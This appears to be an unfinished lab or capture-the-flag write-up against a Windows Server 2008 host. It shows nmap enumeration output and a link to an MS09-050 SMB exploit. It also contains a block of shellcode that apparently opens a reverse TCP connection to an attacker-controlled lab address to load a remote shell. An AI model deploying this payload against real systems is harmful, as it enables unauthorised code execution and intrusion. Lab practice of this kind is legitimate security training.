#Pwned! 
```IP
192.168.227.40
```
## Enumeration
## Nmap
As always I start enumerating target ports with nmap:
```Bash
sudo nmap -sCV 192.168.227.40 -vvv -p- -oN enum/full
```
The output being:
```
PORT      STATE SERVICE            REASON          VERSION                              53/tcp    open  domain             syn-ack ttl 125 Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)        
| dns-nsid:                                                                             |_  bind.version: Microsoft DNS 6.0.6001 (17714650)                                     135/tcp   open  msrpc              syn-ack ttl 125 Microsoft Windows RPC                139/tcp   open  netbios-ssn        syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack ttl 125 Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server? syn-ack ttl 125
5357/tcp  open  http               syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable          
|_http-server-header: Microsoft-HTTPAPI/2.0                                             49152/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC                49153/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC                49154/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC                49155/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC                49156/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC                49157/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC                49158/tcp open  msrpc              syn-ack ttl 125 Microsoft Windows RPC
```

## Nmap UDP


# Enumeration
## SMB

https://github.com/sec13b/ms09-050_CVE-2009-3103

```
shell =  b""
shell += b"\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64"
shell += b"\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28"
shell += b"\x31\xff\x0f\xb7\x4a\x26\x31\xc0\xac\x3c\x61\x7c"
shell += b"\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49\x75\xef\x52"
shell += b"\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78"
shell += b"\x85\xc0\x74\x4c\x01\xd0\x50\x8b\x48\x18\x8b\x58"
shell += b"\x20\x01\xd3\x85\xc9\x74\x3c\x49\x31\xff\x8b\x34"
shell += b"\x8b\x01\xd6\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38"
shell += b"\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58"
shell += b"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
shell += b"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b"
shell += b"\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12"
shell += b"\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00\x00\x68"
shell += b"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\x89\xe8"
shell += b"\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
shell += b"\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x2d"
shell += b"\xef\x68\x02\x00\x01\xbb\x89\xe6\x50\x50\x50\x50"
shell += b"\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97"
shell += b"\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85"
shell += b"\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00"
shell += b"\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f"
shell += b"\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68"
shell += b"\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5"
shell += b"\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9"
shell += b"\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00"
shell += b"\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff"
shell += b"\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff"
shell += b"\x0c\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff"
shell += b"\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb\xe0\x1d\x2a"
shell += b"\x0a\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a"
shell += b"\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00"
shell += b"\x53\xff\xd5"
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241016093827.png?raw=true)

## HTTP

# PrivEsc

## Manual

## Automated

### Peass
### Mimikatz


